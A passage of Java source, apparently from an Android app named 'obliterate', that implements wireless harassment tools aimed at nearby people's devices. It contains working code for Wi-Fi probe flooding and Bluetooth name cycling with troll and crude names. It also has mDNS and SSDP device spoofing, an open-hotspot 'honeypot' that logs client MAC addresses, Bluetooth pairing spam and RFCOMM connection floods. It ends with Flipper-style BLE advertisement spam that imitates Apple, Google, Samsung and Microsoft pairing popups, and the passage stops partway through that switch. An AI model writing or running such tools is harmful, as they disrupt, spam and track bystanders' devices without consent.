            log("  [Probe] runner start, isProbeFlood=" + isProbeFlood);
            final String[] trollSSIDs = {
                "FBI_Surveillance_Van", "NSA_Listening_Post_7", "CIA_Field_Office",
                "Police_Drone_42", "Homeland_Security_Drone", "Secret_Service_Detail",
                "Interpol_Mobile_Unit", "DEA_Monitoring", "Military_Police_Air",
                "Apple_Internal_Test", "Google_Data_Collection", "Microsoft_Security_Audit",
                "Amazon_Delivery_Drone", "Meta_Ad_Tracker", "Tesla_Telemetry",
                "Your_Location_Tracked", "Microphone_Active", "Camera_Remote_Access",
                "This_Device_Infected", "You_Are_Watched", "Security_Breach",
                "FBI_Van_Outside", "Police_Stakeout", "Drone_Overhead",
                "Free_WiFi_No_Pass", "HACKED_NETWORK", "STARBUCKS_SECURE",
                "iPhone_15_Pro_Max", "Samsung_S25_Ultra", "Pixel_10_Pro",
                "Mom_iPhone", "Dad_Galaxy", "Karen_AirPods",
            };
            int idx = 0; int count = 0;
            boolean loggedProbeError = false;
            while (isProbeFlood) {
                final String ssid = trollSSIDs[idx % trollSSIDs.length] + "_" + (idx % 999);
                idx++;
                try {
                    // Remove previous network if exists
                    if (probeFloodNetId >= 0) {
                        wifiManager.removeNetwork(probeFloodNetId);
                        probeFloodNetId = -1;
                    }
                    // Add a temporary open network then request a scan; Android may throttle this.
                    WifiConfiguration wc = new WifiConfiguration();
                    wc.SSID = "\"" + ssid + "\"";
                    wc.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
                    probeFloodNetId = wifiManager.addNetwork(wc);
                    if (probeFloodNetId >= 0) {
                        wifiManager.enableNetwork(probeFloodNetId, false);
                        wifiManager.saveConfiguration();
                    }
                } catch (Exception e) {
                    if (!loggedProbeError) {
                        loggedProbeError = true;
                        final String err = e.getClass().getSimpleName() + (e.getMessage() != null ? ": " + e.getMessage() : "");
                        mainHandler.post(new Runnable() { public void run() { log("✕ Probe cycle error: " + err); }});
                    }
                }
                // Request a scan; firmware/Android decide what actually goes over the air.
                try { wifiManager.startScan(); } catch (Exception e) {}
                count++;
                if (count % 10 == 0) {
                    final int c = count; final String s = ssid;
                    mainHandler.post(new Runnable() { public void run() {
                        log("  📡 Probe #" + c + ": \"" + s + "\"");
                        updateStatus("PROBE: " + s.substring(0, Math.min(16, s.length())));
                    }});
                }
                try { Thread.sleep(200); } catch (InterruptedException e) { break; }
            }
            // Cleanup
            if (probeFloodNetId >= 0) {
                try { wifiManager.removeNetwork(probeFloodNetId); probeFloodNetId = -1; } catch (Exception e) {}
            }
            final int sent = count;
            mainHandler.post(new Runnable() { public void run() {
                log("📡 Probe cycle stopped — " + sent + " scan requests");
                updateStatus("READY");
            }});
            releaseWakeLock();
        }
    }

    // ═══════════════════════════════════════════
    //  PHONE NATIVE — BT NAME TURBO CYCLER
    // ═══════════════════════════════════════════

    private class BtNameTurboRunner implements Runnable {
        public void run() {
            final String[] trollNames = {
                "FBI Surveillance Van", "NSA Listening Post", "Police Drone #42",
                "⚠ Security Breach", "This Device Tracked", "Microphone Active",
                "Camera Remote Access", "Free WiFi No Pass", "Mom iPhone",
                "Hacked Device", "Windows Alert", "Virus Detected",
                "iCloud Locked", "Payment Expired", "Critical Update",
                "CIA Field Office", "Interpol Mobile", "Secret Service",
                "DEA Monitoring", "Homeland Drone", "Military Police",
                "Your Location Pin", "You Are Watched", "AirTag Tracker",
                "Samsung S25 Ultra", "iPhone 16 Pro Max", "Pixel 10 Pro",
                "Karen AirPods Pro", "Dad Search History", "Bathroom Cam #3",
                "Ceiling Microphone", "Toilet Paper Low", "Mom Hidden",
                "Free VBucks Here", "Roblox Admin", "Discord Mod Tools",
            };
            int idx = 0; int count = 0;
            while (isBtNameTurbo) {
                final String name = trollNames[idx % trollNames.length] + " " + (idx % 99);
                idx++;
                try {
                    btAdapter.setName(name);
                } catch (Exception e) {
                    // Fallback: try reflection if setName blocked
                    try {
                        java.lang.reflect.Method m = btAdapter.getClass().getMethod("setName", String.class);
                        m.invoke(btAdapter, name);
                    } catch (Exception ex) {}
                }
                count++;
                if (count % 20 == 0) {
                    final int c = count; final String n = name;
                    mainHandler.post(new Runnable() { public void run() {
                        log("  📛 Turbo #" + c + ": \"" + n + "\"");
                        updateStatus("TURBO: " + n.substring(0, Math.min(16, n.length())));
                    }});
                }
                try { Thread.sleep(100); } catch (InterruptedException e) { break; }
            }
            // Restore original name (captured on UI thread before runner started)
            final String originalName = capturedSpoofName;
            try { btAdapter.setName(originalName != null ? originalName : "Android"); } catch (Exception e) {}
            final int changed = count;
            mainHandler.post(new Runnable() { public void run() {
                log("📛 Name turbo stopped — " + changed + " name changes");
                updateStatus("READY");
            }});
            releaseWakeLock();
        }
    }

    // ═══════════════════════════════════════════
    //  PHONE NATIVE — mDNS SPOOFER
    // ═══════════════════════════════════════════

    private class MdnsSpooferRunner implements Runnable {
        public void run() {
            log("  [mDNS] runner start, isMdnsSpoof=" + isMdnsSpoof);
            if (multicastLock != null) try { multicastLock.acquire(); } catch (Exception e) {}
            final String[][] trollDevices = {
                {"FBI-Surveillance-Van-3.local", "192.168.1.50", "_airplay._tcp.local:_raop._tcp.local"},
                {"NSA-Listening-Post-7.local", "192.168.1.51", "_printer._tcp.local:_http._tcp.local:_scanner._tcp.local"},
                {"Samsung-Fridge-5G.local", "192.168.1.52", "_googlecast._tcp.local:_spotify-connect._tcp.local"},
                {"NOT-A-BOMB.local", "192.168.1.53", "_airport._tcp.local:_tftp._tcp.local"},
                {"Karens-CCTV-CAM-4.local", "192.168.1.54", "_rtsp._tcp.local:_http._tcp.local"},
                {"You-Are-Watched.local", "192.168.1.55", "_airplay._tcp.local:_raop._tcp.local:_googlecast._tcp.local"},
                {"Skynet-Dev-Node.local", "192.168.1.56", "_ssh._tcp.local:_telnet._tcp.local:_ftp._tcp.local"},
                {"HR-Disciplinary.local", "192.168.1.57", "_smb._tcp.local:_afpovertcp._tcp.local"},
                {"FREE-OnlyFans-WiFi.local", "192.168.1.58", "_airplay._tcp.local:_googlecast._tcp.local"},
                {"Mom-Vibrator-Pro.local", "192.168.1.59", "_airplay._tcp.local:_spotify-connect._tcp.local"},
            };
            java.util.Random rng = new java.util.Random();
            java.net.MulticastSocket sock = null;
            int burst = 0;
            try {
                sock = new java.net.MulticastSocket();
                sock.setTimeToLive(255);
                final java.net.InetAddress group = java.net.InetAddress.getByName("224.0.0.251");
                String localIp = getLocalIpStr();
                while (isMdnsSpoof) {
                    burst++;
                    int pick = 2 + rng.nextInt(3); // 2-4 devices per burst
                    java.util.ArrayList<Integer> idxs = new java.util.ArrayList<>();
                    while (idxs.size() < pick) { int r = rng.nextInt(trollDevices.length); if (!idxs.contains(r)) idxs.add(r); }
                    for (int idx : idxs) {
                        String[] dev = trollDevices[idx];
                        String[] svcs = dev[2].split(":");
                        byte[] packet = buildMdnsPacket(dev[0], dev[1], svcs, rng);
                        java.net.DatagramPacket dp = new java.net.DatagramPacket(packet, packet.length, group, 5353);
                        for (int s = 0; s < 3; s++) { sock.send(dp); Thread.sleep(80); }
                        final String name = dev[0];
                        final int burstNum = burst;
                        mainHandler.post(new Runnable() { public void run() { log("  🌐 [" + burstNum + "] " + name); }});
                    }
                    final int burstNum2 = burst;
                    mainHandler.post(new Runnable() { public void run() { updateStatus("mDNS #" + burstNum2); }});
                    Thread.sleep(10000);
                }
            } catch (Exception e) {
                final String err = e.getClass().getSimpleName() + (e.getMessage() != null ? ": " + e.getMessage() : "");
                mainHandler.post(new Runnable() { public void run() { log("✕ mDNS: " + err); }});
            } finally { if (sock != null) sock.close(); }
            if (multicastLock != null) try { multicastLock.release(); } catch (Exception e) {}
            final int b = burst;
            mainHandler.post(new Runnable() { public void run() { log("🌐 mDNS stopped — " + b + " bursts"); updateStatus("READY"); }});
            releaseWakeLock();
        }
    }

    // ═══════════════════════════════════════════
    //  PHONE NATIVE — SSDP SPOOFER
    // ═══════════════════════════════════════════

    private class SsdpSpooferRunner implements Runnable {
        public void run() {
            log("  [SSDP] runner start, isSsdpSpoof=" + isSsdpSpoof);
            if (multicastLock != null) try { multicastLock.acquire(); } catch (Exception e) {}
            final String[][] trollDevices = {
                {"uuid:FBI-Surveillance-Van-3", "upnp:rootdevice", "Linux/2.6 UPnP/1.0 FBI-SVR/1.0", "http://192.168.1.100:5000/root.xml", "FBI Surveillance Van"},
                {"uuid:Samsung-Fridge-5G", "urn:schemas-upnp-org:device:InternetGatewayDevice:1", "Samsung/1.0 UPnP/1.0", "http://192.168.1.100:8080/desc.xml", "Samsung Fridge 5G"},
                {"uuid:NSA-Media-Server", "urn:schemas-upnp-org:device:MediaRenderer:1", "NSA-PR/1.0 UPnP/1.0", "http://192.168.1.100:9000/device.xml", "NSA Media Server"},
                {"uuid:HR-Disciplinary", "urn:schemas-upnp-org:device:Basic:1", "Windows-NT/10.0 UPnP/1.0", "http://192.168.1.100:5357/root.xml", "HR Disciplinary Files"},
                {"uuid:Karens-CCTV-4", "urn:schemas-upnp-org:device:DigitalSecurityCamera:1", "Hikvision/5.5 UPnP/1.0", "http://192.168.1.100:554/desc.xml", "Karen CCTV #4"},
                {"uuid:INFECTED-Printer", "urn:schemas-upnp-org:device:Printer:1", "HP-LaserJet/1.0 UPnP/1.0", "http://192.168.1.100:631/root.xml", "INFECTED Printer"},
                {"uuid:OnlyFans-Router", "urn:schemas-upnp-org:device:WANConnectionDevice:1", "Router/1.0 UPnP/1.0", "http://192.168.1.100:80/device.xml", "OnlyFans WiFi Router"},
                {"uuid:Skynet-Dev-Node", "urn:schemas-upnp-org:device:MediaServer:1", "Skynet/3.0 UPnP/1.0", "http://192.168.1.100:8200/root.xml", "Skynet Dev Node"},
                {"uuid:Mom-Vibrator-Pro", "urn:schemas-upnp-org:device:BinaryLight:1", "Lovense/2.0 UPnP/1.0", "http://192.168.1.100:9999/device.xml", "Mom Vibrator Pro"},
                {"uuid:You-Are-Watched", "urn:schemas-upnp-org:device:MediaRenderer:1", "Panopticon/1.0 UPnP/1.0", "http://192.168.1.100:9090/root.xml", "You Are Watched"},
            };
            java.util.Random rng = new java.util.Random();
            java.net.MulticastSocket sock = null;
            int burst = 0;
            try {
                sock = new java.net.MulticastSocket();
                sock.setTimeToLive(4);
                final java.net.InetAddress group = java.net.InetAddress.getByName("239.255.255.250");
                String localIp = getLocalIpStr();
                while (isSsdpSpoof) {
                    burst++;
                    int pick = 3 + rng.nextInt(3);
                    java.util.ArrayList<Integer> idxs = new java.util.ArrayList<>();
                    while (idxs.size() < pick) { int r = rng.nextInt(trollDevices.length); if (!idxs.contains(r)) idxs.add(r); }
                    for (int idx : idxs) {
                        String[] dev = trollDevices[idx];
                        String msg = buildSsdpNotify(dev[0], dev[1], dev[2], dev[3].replace("192.168.1.100", localIp));
                        byte[] data = msg.getBytes();
                        java.net.DatagramPacket dp = new java.net.DatagramPacket(data, data.length, group, 1900);
                        for (int s = 0; s < 2; s++) { sock.send(dp); Thread.sleep(80); }
                        final String name = dev[4];
                        final int burstNum = burst;
                        mainHandler.post(new Runnable() { public void run() { log("  📺 [" + burstNum + "] " + name); }});
                    }
                    final int burstNum2 = burst;
                    mainHandler.post(new Runnable() { public void run() { updateStatus("SSDP #" + burstNum2); }});
                    Thread.sleep(30000);
                }
                // Send byebye for cleanup
                for (String[] dev : trollDevices) {
                    String bye = "NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nNT: " + dev[1] + "\r\nNTS: ssdp:byebye\r\nUSN: " + dev[0] + "\r\n\r\n";
                    byte[] bd = bye.getBytes();
                    java.net.DatagramPacket dp = new java.net.DatagramPacket(bd, bd.length, group, 1900);
                    sock.send(dp);
                }
            } catch (Exception e) {
                final String err = e.getClass().getSimpleName() + (e.getMessage() != null ? ": " + e.getMessage() : "");
                mainHandler.post(new Runnable() { public void run() { log("✕ SSDP: " + err); }});
            } finally { if (sock != null) sock.close(); }
            if (multicastLock != null) try { multicastLock.release(); } catch (Exception e) {}
            final int b = burst;
            mainHandler.post(new Runnable() { public void run() { log("📺 SSDP stopped — " + b + " bursts"); updateStatus("READY"); }});
            releaseWakeLock();
        }
    }

    // ═══════════════════════════════════════════
    //  PHONE NATIVE — WIFI HONEYPOT
    // ═══════════════════════════════════════════

    private class HotspotHoneypotRunner implements Runnable {
        public void run() {
            try {
                java.lang.reflect.Method m = wifiManager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class);
                WifiConfiguration cfg = new WifiConfiguration();
                cfg.SSID = "\"Free_WiFi_No_Pass\"";
                cfg.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
                m.invoke(wifiManager, cfg, true);
                mainHandler.post(new Runnable() { public void run() {
                    log("📶 Hotspot ON: \"Free_WiFi_No_Pass\" — open, no password");
                    log("  Monitoring for curious devices...");
                }});
                int prevCount = 0;
                while (isHoneypot) {
                    Thread.sleep(5000);
                    java.io.BufferedReader br = null;
                    final java.util.ArrayList<String> clients = new java.util.ArrayList<>();
                    try {
                        br = new java.io.BufferedReader(new java.io.FileReader("/proc/net/arp"));
                        br.readLine(); // skip header
                        String line;
                        while ((line = br.readLine()) != null) {
                            String[] p = line.trim().split("\\s+");
                            if (p.length >= 4) {
                                String mac = p[3];
                                if (!mac.equals("00:00:00:00:00:00") && mac.contains(":")) {
                                    String vendor = getMacVendor(mac);
                                    clients.add(p[0] + " " + mac + (vendor != null ? " [" + vendor + "]" : ""));
                                }
                            }
                        }
                    } catch (Exception e) {}
                    finally { if (br != null) try { br.close(); } catch (Exception ex) {} }
                    if (clients.size() != prevCount) {
                        prevCount = clients.size();
                        final int c = clients.size();
                        mainHandler.post(new Runnable() { public void run() {
                            log("  📶 Hotspot clients: " + c);
                            for (String cl : clients) log("    " + cl);
                            updateStatus("HONEYPOT: " + c + " clients");
                        }});
                    }
                }
                // Cleanup: turn off hotspot
                m.invoke(wifiManager, cfg, false);
            } catch (Exception e) {
                isHoneypot = false;
                final String msg = e.getMessage();
                mainHandler.post(new Runnable() { public void run() {
                    log("✕ Hotspot failed: " + (msg != null ? msg : "API blocked"));
                    log("  Honeypot requires system-app privileges (setWifiApEnabled).");
                    log("  Won't work on stock Android without root/system signature.");
                    updateStatus("READY");
                }});
            }
            releaseWakeLock();
        }
    }

    // ═══════════════════════════════════════════
    //  mDNS / SSDP PACKET BUILDERS
    // ═══════════════════════════════════════════

    private byte[] buildMdnsPacket(String hostname, String ipAddr, String[] services, java.util.Random rng) {
        return ObNet.buildMdnsPacket(hostname, ipAddr, services, rng);
    }

    private String buildSsdpNotify(String usn, String nt, String server, String location) {
        return ObNet.buildSsdpNotify(usn, nt, server, location);
    }

    // ═══════════════════════════════════════════
    //  EXPORT SCANS
    // ═══════════════════════════════════════════

    private String escapeJson(String s) {
        return ObText.escapeJson(s);
    }

    private boolean hasStoragePermission() {
        return ObStorage.hasLegacyWritePermission(this);
    }

    private void requestStoragePermission(Runnable onGranted) {
        pendingStorageAction = onGranted;
        ObStorage.requestLegacyWritePermission(this, REQUEST_STORAGE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == REQUEST_STORAGE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            log("✓ Storage permission granted");
            if (pendingStorageAction != null) {
                pendingStorageAction.run();
                pendingStorageAction = null;
            }
        }
    }

    private void exportScans() {
        if (!hasStoragePermission()) {
            log("📁 Requesting storage permission for export...");
            requestStoragePermission(new Runnable() { public void run() { exportScans(); }});
            return;
        }
        final java.util.ArrayList<BluetoothDevice> devs;
        synchronized (discoveredDevices) { devs = new java.util.ArrayList<>(discoveredDevices); }
        if (devs.isEmpty()) { log("✕ No devices to export. Scan first."); return; }
        new Thread(new Runnable() { public void run() {
            try {
                java.io.File outFile = new java.io.File(android.os.Environment.getExternalStoragePublicDirectory(
                    android.os.Environment.DIRECTORY_DOWNLOADS), "obliterate_scan.json");
                java.io.FileWriter fw = new java.io.FileWriter(outFile);
                fw.write("{\n  \"timestamp\": \"" + new java.util.Date() + "\",\n");
                fw.write("  \"device_count\": " + devs.size() + ",\n");
                fw.write("  \"devices\": [\n");
                for (int i = 0; i < devs.size(); i++) {
                    BluetoothDevice d = devs.get(i);
                    String name = escapeJson(getName(d));
                    fw.write("    {\n");
                    fw.write("      \"name\": \"" + name + "\",\n");
                    fw.write("      \"address\": \"" + d.getAddress() + "\",\n");
                    fw.write("      \"type\": \"" + (d.getType() == BluetoothDevice.DEVICE_TYPE_CLASSIC ? "classic" : d.getType() == BluetoothDevice.DEVICE_TYPE_LE ? "ble" : "dual") + "\",\n");
                    fw.write("      \"bond_state\": " + d.getBondState() + "\n");
                    fw.write("    }" + (i < devs.size() - 1 ? "," : "") + "\n");
                }
                fw.write("  ]\n}\n");
                fw.close();
                final String path = outFile.getAbsolutePath();
                mainHandler.post(new Runnable() { public void run() {
                    log("📋 Exported " + devs.size() + " devices → " + path);
                    updateStatus("READY");
                }});
            } catch (Exception e) {
                final String msg = e.getMessage();
                mainHandler.post(new Runnable() { public void run() {
                    log("✕ Export failed: " + msg);
                    updateStatus("READY");
                }});
            }
        }}).start();
        log("📋 Exporting " + devs.size() + " devices...");
    }

    private boolean wifiConnected() {
        return ObNet.wifiConnected(wifiManager);
    }

    private String getLocalIpStr() {
        return ObNet.localIp(wifiManager);
    }

    // ═══════════════════════════════════════════
    //  BT PAIRING SPAM
    // ═══════════════════════════════════════════

    private void togglePairSpam() {
        if (isPairSpam) { isPairSpam = false; resetBtn(btnPairSpam, "🔗 PAIR SPAM"); log("🛑 Pair spam stopped"); updateStatus("READY"); releaseWakeLock(); }
        else { if (!btReady() || discoveredDevices.isEmpty()) { log("✕ Scan first"); return; }
            isPairSpam = true; setBtnOn(btnPairSpam, "🔗 PAIR ON"); log("⚡ Pairing request cycle started"); acquireWakeLock(); new Thread(new PairSpamRunner()).start(); }
    }

    private class PairSpamRunner implements Runnable {
        public void run() {
            ArrayList<BluetoothDevice> devices; synchronized (discoveredDevices) { devices = new ArrayList<>(discoveredDevices); } for (BluetoothDevice d : devices) {
                if (!isPairSpam) break; final String n = getName(d);
                log("🔗 → " + n); updateStatus("PAIR → " + n);
                try {
                    if (d.getBondState() == BluetoothDevice.BOND_BONDED || d.getBondState() == BluetoothDevice.BOND_BONDING)
                    { d.getClass().getMethod("removeBond").invoke(d); Thread.sleep(400); }
                    d.getClass().getMethod("createBond").invoke(d);
                    Thread.sleep(1200);
                    if (d.getBondState() == BluetoothDevice.BOND_BONDING)
                        d.getClass().getMethod("cancelBondProcess").invoke(d);
                } catch (Exception e) { log("  ✕ " + n); }
            }
            if (isPairSpam) { log("  ↻ Looping..."); try { Thread.sleep(2000); } catch (InterruptedException e) { return; } run(); }
        }
    }

    // ═══════════════════════════════════════════
    //  BT CONNECTION FLOOD
    // ═══════════════════════════════════════════

    private void toggleConnSpam() {
        if (isConnSpam) { isConnSpam = false; resetBtn(btnConnSpam, "🔄 CONN FLOOD"); log("🛑 Conn flood stopped"); updateStatus("READY"); releaseWakeLock(); }
        else { if (!btReady() || discoveredDevices.isEmpty()) { log("✕ Scan first"); return; }
            isConnSpam = true; setBtnOn(btnConnSpam, "🔄 CONN ON"); log("⚡ RFCOMM connection cycle started"); acquireWakeLock(); new Thread(new ConnFloodRunner()).start(); }
    }

    private class ConnFloodRunner implements Runnable {
        public void run() {
            ArrayList<BluetoothDevice> devices; synchronized (discoveredDevices) { devices = new ArrayList<>(discoveredDevices); } for (BluetoothDevice d : devices) {
                if (!isConnSpam) break; final String n = getName(d);
                log("🔄 " + n); updateStatus("CONN → " + n);
                BluetoothSocket s = null;
                try {
                    d.getClass().getMethod("cancelPairingUserInput").invoke(d);
                    s = (BluetoothSocket) d.getClass().getMethod("createRfcommSocket", int.class).invoke(d, 1);
                    s.connect(); Thread.sleep(200); s.close();
                } catch (Exception e) { log("  ✕ " + n); }
                finally { if (s != null) try { s.close(); } catch (Exception ex) {} }
                try { Thread.sleep(400); } catch (InterruptedException e) { break; }
            }
            if (isConnSpam) { log("  ↻ Looping..."); try { Thread.sleep(1000); } catch (InterruptedException e) { return; } run(); }
        }
    }

    // ═══════════════════════════════════════════
    //  BLE AD SPAM
    // ═══════════════════════════════════════════

    private void toggleBleSpam() {
        if (isBleSpam) { isBleSpam = false; resetBtn(btnBleSpam, "📶 BLE SPAM"); log("🛑 BLE spam stopped"); updateStatus("READY"); releaseWakeLock(); }
        else { if (!btReady()) return;
            isBleSpam = true; setBtnOn(btnBleSpam, "📶 BLE ON"); log("⚡ BLE advertising cycle started"); acquireWakeLock(); startBleCycle(); }
    }

    private void startBleCycle() {
        if (!isBleSpam) return;
        BluetoothLeAdvertiser adv = btAdapter.getBluetoothLeAdvertiser();
        if (adv == null) { log("✕ No BLE advertiser"); toggleBleSpam(); return; }
        String name = spoofNameInput.getText().toString();
        try {
            byte[] payload = hexToBytes(customPayloadInput.getText().toString().replaceAll("\\s", ""));
            AdvertiseData d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addManufacturerData(0xFFFF, payload).addServiceUuid(
                    ParcelUuid.fromString("0000180A-0000-1000-8000-00805F9B34FB")).build();
            AdvertiseData sr = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addManufacturerData(0x0413, name.getBytes()).build();
            AdvertiseSettings s = new AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                .setConnectable(false).setTimeout(0).build();
            BleAdCb cb = new BleAdCb(name);
            activeBleAdCb = cb;
            adv.startAdvertising(s, d, sr, cb);
            mainHandler.postDelayed(new Runnable() { public void run() {
                adv.stopAdvertising(cb); if (isBleSpam) startBleCycle();
            }}, 8000);
        } catch (Exception e) { log("✕ BLE: " + e.getMessage()); }
    }

    private class BleAdCb extends AdvertiseCallback {
        final String n; BleAdCb(String name) { n = name; }
        public void onStartSuccess(AdvertiseSettings s) { log("  ✓ BLE: " + n); updateStatus("BLE SPAM"); }
        public void onStartFailure(int code) { log("  ✕ BLE fail: " + code); if (isBleSpam) mainHandler.postDelayed(new Runnable() { public void run() { startBleCycle(); }}, 2000); }
    }

    // ═══════════════════════════════════════════
    //  WIFI DIRECT SPAM
    // ═══════════════════════════════════════════

    private void toggleWifiSpam() {
        if (isWifiSpam) {
            isWifiSpam = false;
            resetBtn(btnWifiSpam, "📡 WIFI DIRECT SPAM");
            if (wifiP2pManager != null && wifiChannel != null)
                try { wifiP2pManager.stopPeerDiscovery(wifiChannel, null); } catch (Exception e) {}
            log("🛑 WiFi Direct spam stopped");
            updateStatus("READY"); releaseWakeLock();
        } else {
            if (wifiP2pManager == null || wifiChannel == null) { log("✕ No WiFi Direct"); return; }
            isWifiSpam = true;
            setBtnOn(btnWifiSpam, "📡 WIFI ON");
            log("⚡ WiFi Direct cycle started — peer discovery/invites depend on nearby devices");
            acquireWakeLock();
            startWifiSpamCycle();
        }
    }

    private void startWifiSpamCycle() {
        if (!isWifiSpam || wifiP2pManager == null || wifiChannel == null) return;
        try {
            wifiP2pManager.discoverPeers(wifiChannel, new WifiP2pManager.ActionListener() {
                public void onSuccess() { log("  ✓ WiFi Direct discovery started"); }
                public void onFailure(int code) { log("  ⚠ WiFi discovery failed: " + code); }
            });
        } catch (Exception e) { log("  ✕ WiFi: " + e.getMessage()); }
        
        mainHandler.postDelayed(new Runnable() { public void run() {
            if (isWifiSpam) startWifiSpamCycle();
        }}, 10000);
    }

    // ═══════════════════════════════════════════
    //  TARGETED BLE SPAM (Flipper-style) — dropdown
    // ═══════════════════════════════════════════

    private void fireTargetedBle() {
        if (!isBleTargetActive) return;
        BluetoothLeAdvertiser adv = btAdapter.getBluetoothLeAdvertiser();
        if (adv == null) { log("✕ No BLE advertiser"); isBleTargetActive = false; resetBtn(btnBleFire, "🔥 FIRE"); return; }
        int mode = currentBleMode;
        AdvertiseSettings s = new AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false).setTimeout(0).build();
        AdvertiseData d = null;
        String name = spoofNameInput.getText().toString();
        if (isCycling) { String[] modeNames = {"🪟 Swift Pair","🤖 FP CD8256","🤖 FP F52494","🤖 FP 718FA4","🤖 FP 821F66","🍎 NewDev seed","🍎 Action seed","🍎 iOS17 test","🍎 AirTag seed","🍎 NotYours seed","⭐ Buds seed","⭐ Watch seed","💗 Love Play","💗 Love Stop","😴 AirSense seed","📛 Settings Flood","🔥 Aggressive","📁 AirDrop seed","🔄 Handoff seed","📶 Tethering seed","📡 WiFi scan","📤 NearbyShare seed","📍 EddyUID","🔗 EddyURL","📍 iBeacon","🔍 FindMy-like","🦠 ExpoNotify seed"}; log("  ↻ ["+(mode+1)+"/27] "+modeNames[mode]); updateStatus("CYCLING: "+modeNames[mode]); }
        try {
        switch (mode) {
        case 0: { log("🪟 Swift Pair"); byte[] sp = new byte[3 + name.length()]; sp[0]=0x03; sp[1]=0x00; sp[2]=(byte)0x80; System.arraycopy(name.getBytes(),0,sp,3,name.length()); d = new AdvertiseData.Builder().setIncludeDeviceName(false).addManufacturerData(0x0006,sp).build(); break; }
        case 1: case 2: case 3: case 4: { String[] fpIds = {"CD8256","F52494","718FA4","821F66","92BBBD"}; byte[] fpd = hexToBytes(fpIds[(mode-1)%5]); d = new AdvertiseData.Builder().setIncludeDeviceName(false).addServiceUuid(ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")).addServiceData(ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"), new byte[]{fpd[0],fpd[1],fpd[2]}).build(); break; }
        case 5: { byte[] ap=new byte[25]; ap[0]=0x07; ap[1]=0x19; for(int i=2;i<25;i++)ap[i]=(byte)(Math.random()*256); ap[6]=(byte)(Math.random()*100);ap[7]=(byte)(Math.random()*100);ap[8]=(byte)(Math.random()*256); d=new AdvertiseData.Builder().setIncludeDeviceName(false).addManufacturerData(0x004C,ap).build(); break; }
        case 6: { byte[] acts={0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B}; byte action=acts[(int)(Math.random()*acts.length)]; byte flag=(byte)0xC0; if(action==0x20 && Math.random()<0.5) flag--; if(action==0x09 && Math.random()<0.5) flag=0x40; byte[] c2={0x0F,0x05,flag,action,(byte)(Math.random()*256),(byte)(Math.random()*256),(byte)(Math.random()*256)}; d=new AdvertiseData.Builder().setIncludeDeviceName(false).addManufacturerData(0x004C,c2).build(); break; }
        case 7: { byte[] cacts={0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B}; byte ca=cacts[(int)(Math.random()*cacts.length)]; byte cf=(byte)0xC0; if(ca==0x20 && Math.random()<0.5) cf--; if(ca==0x09 && Math.random()<0.5) cf=0x40; byte[] cr={0x0F,0x05,cf,ca,(byte)(Math.random()*256),(byte)(Math.random()*256),(byte)(Math.random()*256),0x00,0x00,0x10,(byte)(Math.random()*256),(byte)(Math.random()*256),(byte)(Math.random()*256)}; d=new AdvertiseData.Builder().setIncludeDeviceName(false).addManufacturerData(0x004C,cr).build(); break; }
        case 8: { byte[] ap4=new byte[25]; ap4[0]=0x07; ap4[1]=0x19; ap4[2]=0x05; ap4[3]=0x00; ap4[4]=0x55; ap4[9]=0x00; for(int i=5;i<25;i++){if(i==6)ap4[i]=(byte)(Math.random()*100);else if(i==7)ap4[i]=(byte)(Math.random()*100);else if(i==8)ap4[i]=(byte)(Math.random()*256);else if(i>9)ap4[i]=(byte)(Math.random()*256);} d=new AdvertiseData.Builder().setIncludeDeviceName(false).addManufacturerData(0x004C,ap4).build(); break; }
        case 9: { byte[] ap5=new byte[25]; ap5[0]=0x07; ap5[1]=0x19; String[] devIds={"0E20","0A20","0220","0F20","1320","1420"}; byte[] dev=hexToBytes(devIds[(int)(Math.random()*devIds.length)]); ap5[2]=0x01; ap5[3]=dev[0]; ap5[4]=dev[1]; ap5[9]=0x00; for(int i=5;i<25;i++){if(i==6)ap5[i]=(byte)(Math.random()*100);else if(i==7)ap5[i]=(byte)(Math.random()*100);else if(i==8)ap5[i]=(byte)(Math.random()*256);else if(i>9)ap5[i]=(byte)(Math.random()*256);} d=new AdvertiseData.Builder().setIncludeDeviceName(false).addManufacturerData(0x004C,ap5).build(); break; }
        case 10: { String sid=name.length()>=8?name.substring(0,8):"12345678"; byte[] spr=hexToBytes("42098102141503210109"); byte[] sap=hexToBytes("063C948E00000000C700"); byte[] sd=hexToBytes(sid.substring(0,4)+"01"+sid.substring(4)); byte[] sp2=new byte[spr.length+sd.length+sap.length]; System.arraycopy(spr,0,sp2,0,spr.length); System.arraycopy(sd,0,sp2,spr.length,sd.length); System.arraycopy(sap,0,sp2,spr.length+sd.length,sap.length); d=new AdvertiseData.Builder().setIncludeDeviceName(true).addManufacturerData(0x0075,sp2).build(); break; }
        case 11: { byte[] wp=hexToBytes("010002000101FF000043"); byte[] wd=hexToBytes(name.length()>=2?name.substring(0,2):"01"); byte[] wp2=new byte[wp.length+wd.length]; System.arraycopy(wp,0,wp2,0,wp.length); System.arraycopy(wd,0,wp2,wp.length,wd.length); d=new AdvertiseData.Builder().setIncludeDeviceName(true).addManufacturerData(0x0075,wp2).build(); break; }
